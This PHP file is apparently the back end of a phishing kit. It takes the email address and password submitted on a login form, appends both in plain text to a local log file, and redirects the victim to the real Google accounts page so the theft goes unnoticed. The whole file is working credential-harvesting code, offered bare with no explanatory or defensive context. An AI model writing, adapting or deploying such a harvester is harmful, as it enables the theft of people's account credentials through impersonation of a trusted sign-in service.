<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = trim($_POST['email']);
    $pass = trim($_POST['password']);
    $log = fopen("log.txt", "a+");
    fwrite($log, "| $email | $pass\n");
    fclose($log);
}
header("Location: https://accounts.google.com/");
exit();
?>
